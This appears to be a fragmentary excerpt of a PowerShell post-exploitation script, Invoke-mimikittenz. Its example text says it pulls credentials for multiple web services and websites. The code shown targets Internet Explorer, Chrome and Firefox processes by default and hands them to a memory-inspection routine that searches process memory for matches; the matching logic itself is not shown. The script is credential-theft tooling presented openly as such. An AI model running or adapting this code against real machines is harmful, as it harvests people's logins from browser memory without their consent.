...
.EXAMPLE
Invoke-mimikittenz
Use above command to pull credentials for multiple web services and websites. 
...
Param(
	[String[]]
	$ProcessName = @("iexplore","chrome","firefox")
)
...
if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
	Write-Verbose "Looking into the following processes:"
	Get-Process $ProcessName -ErrorAction Ignore | % {"$($_.name) => pid:$($_.id)"} | Write-Verbose
}
$matchesFound=[mimikittenz.MemProcInspector]::InspectManyProcs($ProcessName)
